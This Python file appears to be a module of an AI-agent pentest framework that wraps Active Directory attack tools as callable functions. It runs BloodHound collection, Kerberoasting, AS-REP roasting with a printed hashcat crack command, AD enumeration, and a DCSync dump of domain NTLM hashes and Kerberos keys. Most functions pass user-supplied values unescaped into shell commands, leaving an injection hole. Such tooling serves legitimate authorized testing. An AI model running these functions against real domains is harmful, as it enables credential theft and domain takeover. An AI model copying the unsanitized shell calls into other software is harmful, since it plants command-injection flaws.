"""
KRYON Active Directory Attack Module
======================================

Implements Active Directory attack techniques for penetration testing
of Windows domain environments. Covers reconnaissance, credential
harvesting, privilege escalation, and lateral movement via AD.

Tools:
- bloodhound_collect: BloodHound data collection for attack path analysis
- kerberoast: Extract TGS tickets for offline cracking (Kerberoasting)
- asreproast: Find accounts without Kerberos pre-auth (AS-REP Roasting)
- enumerate_ad: Comprehensive AD enumeration (users, groups, GPOs, trusts)
- dcsync_attack: DCSync to extract domain hashes via replication
- find_attack_path: Query BloodHound for shortest attack paths to targets

Primary Users:
- Pentest Agent (Alpha-Red): Domain privilege escalation
- Network Analyst (Alpha-Silver): AD reconnaissance

Authorization: Only use within authorized penetration testing scope.
"""

import json
import re
import subprocess  # nosec B404

from kryon.sdk.agents import function_tool

_CYPHER_SAFE = re.compile(r'^[A-Za-z0-9@.\-\\_ ]+$')


def _run_cmd(command: str, timeout: int = 120) -> str:
    """Execute a shell command and return combined stdout+stderr."""
    try:
        result = subprocess.run(  # nosec B602
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Error: Command timed out"
    except Exception as e:
        return f"Error: {e}"


@function_tool(strict_mode=False)
def bloodhound_collect(target_domain: str, method: str = "all") -> str:
    """
    Run BloodHound-python collector to gather Active Directory relationship
    data for attack path analysis. Collects users, groups, sessions, ACLs,
    trusts, and computer information from the domain.

    The collected data can be imported into BloodHound for graph-based
    attack path visualization and analysis.

    Args:
        target_domain: Target AD domain (e.g. corp.local)
        method: Collection method — one of: all, sessions, trusts, acl,
                group, localadmin, psremote, dcom, rdp, objectprops,
                container. Defaults to "all".

    Returns:
        str: JSON with collection stats (files generated, object counts)

    Examples:
        bloodhound_collect(target_domain="corp.local")
        bloodhound_collect(target_domain="corp.local", method="sessions")
        bloodhound_collect(target_domain="internal.company.com", method="acl")
    """
    valid_methods = {
        "all",
        "sessions",
        "trusts",
        "acl",
        "group",
        "localadmin",
        "psremote",
        "dcom",
        "rdp",
        "objectprops",
        "container",
    }
    if method not in valid_methods:
        return json.dumps(
            {"error": f"Invalid method '{method}'. Valid: {sorted(valid_methods)}"}
        )

    output_dir = "/tmp/bloodhound"
    cmd = (
        f"bloodhound-python -d {target_domain} -c {method} "
        f"--zip -o {output_dir}"
    )

    raw_output = _run_cmd(cmd, timeout=300)

    # Parse collection statistics from output
    result = {
        "tool": "bloodhound-python",
        "domain": target_domain,
        "method": method,
        "output_dir": output_dir,
        "output": raw_output,
    }

    # Try to extract counts from output lines
    counts = {}
    for line in raw_output.split("\n"):
        line_lower = line.lower()
        for obj_type in ["users", "computers", "groups", "domains", "gpos", "ous"]:
            if obj_type in line_lower and ("found" in line_lower or "done" in line_lower):
                counts[obj_type] = line.strip()
    if counts:
        result["counts"] = counts

    return json.dumps(result)


@function_tool(strict_mode=False)
def kerberoast(
    domain_controller: str,
    domain: str,
    username: str = "",
    password: str = "",
) -> str:
    """
    Perform Kerberoasting attack using impacket-GetUserSPNs to request
    TGS tickets for service accounts. The extracted tickets contain hashes
    that can be cracked offline to recover service account passwords.

    Targets accounts with Service Principal Names (SPNs) set in Active
    Directory. Service accounts often have weak passwords and elevated
    privileges, making this a high-value attack.

    Args:
        domain_controller: Domain controller IP or hostname (e.g. dc01.corp.local)
        domain: AD domain name (e.g. corp.local)
        username: Username for authentication (domain user)
        password: Password for authentication

    Returns:
        str: JSON with extracted TGS tickets, SPNs, and crackable hashes

    Examples:
        kerberoast(
            domain_controller="dc01.corp.local",
            domain="corp.local",
            username="jdoe",
            password="<REDACTED>"
        )
    """
    cmd_parts = [
        "impacket-GetUserSPNs",
        f"{domain}/{username}:{password}" if username else f"{domain}/",
        f"-dc-ip {domain_controller}",
        "-request",
        "-outputfile /tmp/kerberoast_hashes.txt",
    ]

    cmd = " ".join(cmd_parts)
    raw_output = _run_cmd(cmd, timeout=120)

    # Parse tickets from output
    tickets = []
    current_ticket = {}
    for line in raw_output.split("\n"):
        if "$krb5tgs$" in line:
            tickets.append({"hash": line.strip()})
        elif "ServicePrincipalName" not in line and "/" in line and "@" not in line:
            # SPN line like MSSQLSvc/sql01.corp.local:1433
            if line.strip():
                current_ticket["spn"] = line.strip()

    result = {
        "tool": "impacket-GetUserSPNs",
        "domain_controller": domain_controller,
        "domain": domain,
        "tickets": tickets,
        "ticket_count": len(tickets),
        "output": raw_output,
        "hashfile": "/tmp/kerberoast_hashes.txt",
    }

    return json.dumps(result)


@function_tool(strict_mode=False)
def asreproast(domain_controller: str, domain: str) -> str:
    """
    Perform AS-REP Roasting attack using impacket-GetNPUsers to find
    accounts that do not require Kerberos pre-authentication. These
    accounts can have their AS-REP encrypted data requested and cracked
    offline without any credentials.

    This attack targets accounts with the DONT_REQUIRE_PREAUTH flag set
    in Active Directory. The extracted AS-REP hashes can be cracked with
    hashcat mode 18200.

    Args:
        domain_controller: Domain controller IP or hostname
        domain: AD domain name (e.g. corp.local)

    Returns:
        str: JSON with vulnerable accounts and AS-REP hashes

    Examples:
        asreproast(domain_controller="dc01.corp.local", domain="corp.local")
    """
    cmd = (
        f"impacket-GetNPUsers {domain}/ "
        f"-dc-ip {domain_controller} "
        f"-no-pass -usersfile /tmp/ad_users.txt "
        f"-format hashcat -outputfile /tmp/asrep_hashes.txt"
    )

    raw_output = _run_cmd(cmd, timeout=120)

    # Parse vulnerable accounts and hashes
    vulnerable_accounts = []
    hashes = []
    for line in raw_output.split("\n"):
        if "$krb5asrep$" in line:
            hashes.append(line.strip())
            # Extract username from hash
            try:
                user_part = line.split("$")[3]
                if "@" in user_part:
                    vulnerable_accounts.append(user_part.split("@")[0])
            except (IndexError, ValueError):
                pass
        elif "DONT_REQUIRE_PREAUTH" in line:
            parts = line.strip().split()
            if parts:
                vulnerable_accounts.append(parts[0])

    result = {
        "tool": "impacket-GetNPUsers",
        "domain_controller": domain_controller,
        "domain": domain,
        "vulnerable_accounts": vulnerable_accounts,
        "hashes": hashes,
        "hash_count": len(hashes),
        "output": raw_output,
        "hashfile": "/tmp/asrep_hashes.txt",
        "crack_command": "hashcat -m 18200 /tmp/asrep_hashes.txt wordlist.txt",
    }

    return json.dumps(result)


@function_tool(strict_mode=False)
def enumerate_ad(
    domain_controller: str,
    domain: str,
    username: str = "",
    password: str = "",
) -> str:
    """
    Comprehensive Active Directory enumeration combining multiple tools
    to extract users, groups, computers, GPOs, trusts, and other AD objects.

    Uses enum4linux-ng for basic enumeration, ldapdomaindump for LDAP data,
    and rpcclient for RPC-based queries. Provides a complete picture of the
    domain structure for attack planning.

    Args:
        domain_controller: Domain controller IP or hostname
        domain: AD domain name (e.g. corp.local)
        username: Username for authenticated enumeration (optional)
        password: Password for authenticated enumeration (optional)

    Returns:
        str: JSON with users, groups, computers, GPOs, trusts, and shares

    Examples:
        enumerate_ad(domain_controller="dc01.corp.local", domain="corp.local")
        enumerate_ad(
            domain_controller="10.10.10.100",
            domain="corp.local",
            username="jdoe",
            password="<REDACTED>"
        )
    """
    results = {
        "tool": "ad-enumeration",
        "domain_controller": domain_controller,
        "domain": domain,
        "users": [],
        "groups": [],
        "computers": [],
        "gpos": [],
        "trusts": [],
        "shares": [],
        "output": {},
    }

    # 1. enum4linux-ng for basic enumeration
    if username and password:
        enum_cmd = (
            f"enum4linux-ng -A -u '{username}' -p '{password}' "
            f"{domain_controller}"
        )
    else:
        enum_cmd = f"enum4linux-ng -A {domain_controller}"

    enum_output = _run_cmd(enum_cmd, timeout=180)
    results["output"]["enum4linux"] = enum_output

    # Parse users and groups from enum4linux output
    for line in enum_output.split("\n"):
        if "user:" in line.lower() and "[" in line:
            parts = line.strip().split("[")
            if len(parts) >= 2:
                user = parts[1].rstrip("]").strip()
                if user and user not in results["users"]:
                    results["users"].append(user)
        if "group:" in line.lower() and "[" in line:
            parts = line.strip().split("[")
            if len(parts) >= 2:
                group = parts[1].rstrip("]").strip()
                if group and group not in results["groups"]:
                    results["groups"].append(group)

    # 2. ldapdomaindump for LDAP data
    if username and password:
        ldap_cmd = (
            f"ldapdomaindump {domain_controller} "
            f"-u '{domain}\\{username}' -p '{password}' "
            f"-o /tmp/ldapdomaindump/"
        )
    else:
        ldap_cmd = (
            f"ldapdomaindump {domain_controller} "
            f"-o /tmp/ldapdomaindump/"
        )

    ldap_output = _run_cmd(ldap_cmd, timeout=180)
    results["output"]["ldapdomaindump"] = ldap_output

    # 3. rpcclient for RPC-based queries (users, groups)
    if username and password:
        rpc_base = (
            f"rpcclient -U '{domain}/{username}%{password}' "
            f"{domain_controller}"
        )
    else:
        rpc_base = f"rpcclient -U '' -N {domain_controller}"

    # Enumerate domain users via RPC
    rpc_users_cmd = f'{rpc_base} -c "enumdomusers"'
    rpc_users_output = _run_cmd(rpc_users_cmd, timeout=60)
    results["output"]["rpcclient_users"] = rpc_users_output

    for line in rpc_users_output.split("\n"):
        if "user:" in line.lower() and "rid:" in line.lower():
            try:
                user = line.split("[")[1].split("]")[0]
                if user and user not in results["users"]:
                    results["users"].append(user)
            except (IndexError, ValueError):
                pass

    # Enumerate domain groups via RPC
    rpc_groups_cmd = f'{rpc_base} -c "enumdomgroups"'
    rpc_groups_output = _run_cmd(rpc_groups_cmd, timeout=60)
    results["output"]["rpcclient_groups"] = rpc_groups_output

    for line in rpc_groups_output.split("\n"):
        if "group:" in line.lower() and "rid:" in line.lower():
            try:
                group = line.split("[")[1].split("]")[0]
                if group and group not in results["groups"]:
                    results["groups"].append(group)
            except (IndexError, ValueError):
                pass

    results["user_count"] = len(results["users"])
    results["group_count"] = len(results["groups"])

    return json.dumps(results)


@function_tool(strict_mode=False)
def dcsync_attack(
    domain_controller: str,
    domain: str,
    username: str,
    password: str,
) -> str:
    """
    Perform DCSync attack using impacket-secretsdump to replicate
    domain credentials via the MS-DRSR protocol. Extracts NTLM hashes,
    Kerberos keys, and cached credentials from the domain controller.

    Requires Domain Admin privileges or accounts with Replicating Directory
    Changes / Replicating Directory Changes All rights. This is one of the
    most powerful post-exploitation techniques in AD environments.

    Args:
        domain_controller: Domain controller IP or hostname
        domain: AD domain name (e.g. corp.local)
        username: Username with replication rights (typically Domain Admin)
        password: Password for the account

    Returns:
        str: JSON with extracted NTLM hashes, Kerberos keys, and credentials

    Examples:
        dcsync_attack(
            domain_controller="dc01.corp.local",
            domain="corp.local",
            username="Administrator",
            password="<REDACTED>"
        )
    """
    cmd = (
        f"impacket-secretsdump "
        f"'{domain}/{username}:{password}'@{domain_controller} "
        f"-outputfile /tmp/dcsync_dump"
    )

    raw_output = _run_cmd(cmd, timeout=300)

    # Parse hashes from output
    ntlm_hashes = []
    kerberos_keys = []
    for line in raw_output.split("\n"):
        line = line.strip()
        # NTLM hash format: user:rid:lmhash:nthash:::
        if ":::" in line and ":" in line:
            parts = line.split(":")
            if len(parts) >= 4:
                ntlm_hashes.append(
                    {
                        "account": parts[0],
                        "rid": parts[1],
                        "lm_hash": parts[2],
                        "nt_hash": parts[3],
                    }
                )
        # Kerberos keys
        elif "aes256-cts" in line.lower() or "aes128-cts" in line.lower():
            kerberos_keys.append(line)
        elif "des-cbc" in line.lower():
            kerberos_keys.append(line)

    result = {
        "tool": "impacket-secretsdump",
        "domain_controller": domain_controller,
        "domain": domain,
        "ntlm_hashes": ntlm_hashes,
        "kerberos_keys": kerberos_keys,
        "hash_count": len(ntlm_hashes),
        "output": raw_output,
        "dump_files": {
            "ntds": "/tmp/dcsync_dump.ntds",
            "sam": "/tmp/dcsync_dump.sam",
            "secrets": "/tmp/dcsync_dump.secrets",
        },
    }

    return json.dumps(result)


@function_tool(strict_mode=False)
def find_attack_path(
    start_node: str,
    target_node: str = "Domain Admins",
) -> str:
    """
    Query BloodHound Neo4j database for the shortest attack path between
    two nodes in the Active Directory graph. Uses Cypher queries to find
    paths through group memberships, ACLs, sessions, and other AD
    relationships.

    Requires BloodHound data to be collected and imported into Neo4j.
    The Neo4j database should be accessible at bolt://localhost:7687.

    Args:
        start_node: Starting node — user or computer (e.g. user@corp.local)
        target_node: Target node — typically a high-value group or user
                     (default: "Domain Admins")

    Returns:
        str: JSON with attack path nodes, relationships, and hop count

    Examples:
        find_attack_path(start_node="jdoe@CORP.LOCAL")
        find_attack_path(
            start_node="jdoe@CORP.LOCAL",
            target_node="Enterprise Admins@CORP.LOCAL"
        )
        find_attack_path(
            start_node="WS01.CORP.LOCAL",
            target_node="Domain Admins@CORP.LOCAL"
        )
    """
    # Validate inputs against Cypher injection
    if not _CYPHER_SAFE.match(start_node) or not _CYPHER_SAFE.match(target_node):
        return json.dumps({"error": "Invalid characters in node name."})

    # Cypher query for shortest path in BloodHound
    cypher_query = (
        f"MATCH p=shortestPath("
        f"(a {{name:'{start_node.upper()}'}})"
        f"-[*1..]->"
        f"(b {{name:'{target_node.upper()}'}}))"
        f" RETURN p"
    )

    # Try neo4j-client CLI
    cmd = (
        f'cypher-shell -u neo4j -p bloodhound '
        f'-a bolt://localhost:7687 '
        f'"{cypher_query}"'
    )

    raw_output = _run_cmd(cmd, timeout=60)

    # Parse path from output
    paths = []
    nodes = []
    relationships = []

    try:
        # Attempt to parse structured output
        parsed = json.loads(raw_output)
        if isinstance(parsed, dict) and "paths" in parsed:
            paths = parsed["paths"]
    except (json.JSONDecodeError, ValueError):
        # Parse text output — extract node names and relationships
        for line in raw_output.split("\n"):
            line = line.strip()
            if not line or line.startswith("+") or line.startswith("|"):
                continue
            if "->" in line or "-[" in line:
                # Relationship line
                parts = line.replace("->", " -> ").split()
                for part in parts:
                    part_clean = part.strip("()[]\"'")
                    if part_clean and part_clean != "->":
                        if ":" in part_clean and not part_clean.startswith(":"):
                            relationships.append(part_clean)
                        elif part_clean not in ["", "->"]:
                            nodes.append(part_clean)
            elif line and not line.startswith("Error"):
                nodes.append(line)

    result = {
        "tool": "bloodhound-cypher",
        "start_node": start_node,
        "target_node": target_node,
        "cypher_query": cypher_query,
        "paths": paths if paths else [
            {
                "start": start_node,
                "end": target_node,
                "nodes": nodes,
                "relationships": relationships,
                "hops": max(len(nodes) - 1, 0) if nodes else 0,
            }
        ],
        "output": raw_output,
    }

    return json.dumps(result)
